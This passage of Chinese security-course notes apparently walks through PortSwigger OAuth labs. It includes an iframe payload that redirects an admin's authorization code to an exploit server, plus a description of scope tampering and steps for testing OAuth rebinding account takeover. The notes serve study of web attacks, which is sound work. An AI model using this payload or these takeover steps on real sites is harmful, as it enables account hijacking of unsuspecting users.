+<iframe src="[https://oauth-0a7400cb04161e5e80c1152902690027.oauth-server.net/auth?client_id=hsvii9krryl5joffjyca7&redirect_uri=https://exploit-0a2f0030045c1e37802816fc01070056.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>](https://oauth-0a7400cb04161e5e80c1152902690027.oauth-server.net/auth?client_id=hsvii9krryl5joffjyca7&redirect_uri=https://exploit-0a2f0030045c1e37802816fc01070056.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>)
+
+<p>:::</p>
+<p>就是让管理员一访问网站，就向授权服务器发送授权请求，然后返回的code就会被发到回调地址，回调地址填的是我们的服务器，自然就获取到code，然后带上code直接访问就是管理员账号</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/081-2.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/081-3.png"></p>
+<h2 id="5、scope篡改升级范围信息获取"><a href="#5、scope篡改升级范围信息获取" class="headerlink" title="5、scope篡改升级范围信息获取"></a>5、scope篡改升级范围信息获取</h2><p>scope本身就是控制权限的，这里就是让你改变scope值获取不同权限很好理解</p>
+<p>portswigger.net&#x2F;web-security&#x2F;all-labs#oauth-authentication参考：blog.csdn.net&#x2F;weixin_39190897&#x2F;article&#x2F;details&#x2F;139885599</p>
+<h1 id="四、复盘"><a href="#四、复盘" class="headerlink" title="四、复盘"></a>四、复盘</h1><p><a href="https://mp.weixin.qq.com/s/TSsQ_mWGsFYZiF_RBdfbKg">https://mp.weixin.qq.com/s/TSsQ_mWGsFYZiF_RBdfbKg</a></p>
+<p><a href="https://mp.weixin.qq.com/s/NuNkzax8nb72qb-S1RvTnQ">https://mp.weixin.qq.com/s/NuNkzax8nb72qb-S1RvTnQ</a></p>
+<p><a href="https://mp.weixin.qq.com/s/QuhNuVyb2uy2T-br-mxAJw">https://mp.weixin.qq.com/s/QuhNuVyb2uy2T-br-mxAJw</a></p>
+<p><a href="https://mp.weixin.qq.com/s/TSsRNZtpttqXBviLwtYT9A">https://mp.weixin.qq.com/s/TSsRNZtpttqXBviLwtYT9A</a></p>
+<p>如何测试 OAuth 换绑实现账户接管漏洞</p>
+<ol>
+<li><p>分别在两个浏览器上注册两个账号，分别为账号 A 和账号 B</p>
+</li>
+<li><p>在账号A上走完一遍绑定第三方平台的流程，抓住最后绑定的那个数据包，Send to Repeater然后Drop掉</p>
+</li>
+<li><p>在登陆了账号B的浏览器上，直接去访问账号A先前绑定的URL，观察B是否新绑定了第三方平台，如果是，则存在该漏洞，否则就不存在</p>
+</li>
+</ol>
+<p>演示案例：xxxxxx</p>
+]]></content>
+      <categories>
+        <category>小迪安全课程学习笔记(web攻防)</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
 </search>
